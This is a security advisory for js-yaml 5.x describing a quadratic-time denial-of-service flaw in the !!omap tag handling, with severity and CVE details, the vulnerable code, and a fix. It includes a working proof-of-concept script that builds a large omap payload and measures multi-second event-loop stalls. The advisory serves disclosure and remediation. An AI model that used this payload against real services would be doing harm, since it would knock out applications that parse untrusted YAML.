# [M] js-yaml: Quadratic-complexity (O(n^2)) DoS via !!omap tag in YAML11_SCHEMA

## Summary
Severity: Medium
Advisory: GHSA-724g-mxrg-4qvm
CVE: CVE-2026-59870
CWE: CWE-407, CWE-770
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2026-07-20
Source: https://github.com/advisories/GHSA-724g-mxrg-4qvm
Type: github-advisory

## Affected
- npm: `js-yaml` — affected >=5.0.0 <5.2.1

## Details
### Summary
`js-yaml` v5.x introduces `YAML11_SCHEMA` support with the `!!omap` (ordered map) tag. The `omapTag.addItem()` function performs a linear O(n) scan for duplicate key detection on every insertion, resulting in O(n^2) total time to parse a document with n omap entries. An attacker can send a small crafted YAML document to trigger a multi-second CPU stall in any application that uses `yaml.load()` with `{ schema: yaml.YAML11_SCHEMA }`.

### Details
In `src/tag/sequence/omap.ts` (compiled: `dist/js-yaml.cjs.js:510-525`):
```js
var omapTag = defineSequenceTag('tag:yaml.org,2002:omap', {
    create: () => [],
    addItem: (container, item) => {
        // ...
        for (const existing of container)   // O(n) per insertion!
            if (hasOwnProperty(existing, itemKeys[0]))
                return 'cannot resolve an ordered map item';
        container.push(object);             // n insertions → O(n^2) total
        return '';
    }
});
```
For a document with `n` unique entries, insertion i scans i−1 existing entries, yielding 1+2+…+n = **O(n²)** total work.

### PoC (runtime-confirmed on v5.2.0)
```js
const yaml = require('js-yaml');
function buildOmapPayload(n) {
  let p = '!!omap\n';
  for (let i = 0; i < n; i++) p += '- key' + i + ': val' + i + '\n';
  return p;
}
// Timing results on v5.2.0:
// n=1000:  9ms
// n=5000:  73ms  (5x n → 8x time)
// n=10000: 255ms (2x n → 3.5x time — supralinear)
// n=20000: 997ms (2x n → 3.9x time — O(n²) confirmed)
// n=50000: 10613ms          ← blocks event loop for >10 seconds
yaml.load(buildOmapPayload(50000), { schema: yaml.YAML11_SCHEMA });
```

### Impact
Any application that parses untrusted YAML using `yaml.load(input, { schema: yaml.YAML11_SCHEMA })` is vulnerable to Denial of Service. A ~2 MB payload of 50,000 entries blocks the Node.js event loop for 10+ seconds. Smaller payloads (5,000 entries, ~100 KB) already cause noticeable slowdowns (73 ms per parse, amplified under concurrent load).

This affects the newly released 5.x series (first published 2026-06-20) which adds YAML 1.1/1.2 schema support including `!!omap`. The 4.x series is unaffected (no `YAML11_SCHEMA` export).

### Fix
Replace the O(n) linear scan in `addItem` with an O(1) `Set`-based lookup:
```js
var omapTag = defineSequenceTag('tag:yaml.org,2002:omap', {
    create: () => ({ list: [], seen: new Set() }),
    addItem: (state, item) => {
        const key = Object.keys(item)[0];
        if (state.seen.has(key)) return 'duplicate omap key';
        state.seen.add(key);
        state.list.push(item);
        return '';
    },
    resolve: (state) => state.list
});
```

## References
- https://github.com/nodeca/js-yaml/security/advisories/GHSA-724g-mxrg-4qvm
- https://nvd.nist.gov/vuln/detail/CVE-2026-59870
- https://github.com/nodeca/js-yaml/commit/39f3211a2f01b3c6982710cf21434ab7060acefe
- https://github.com/nodeca/js-yaml
- https://github.com/nodeca/js-yaml/releases/tag/5.2.1
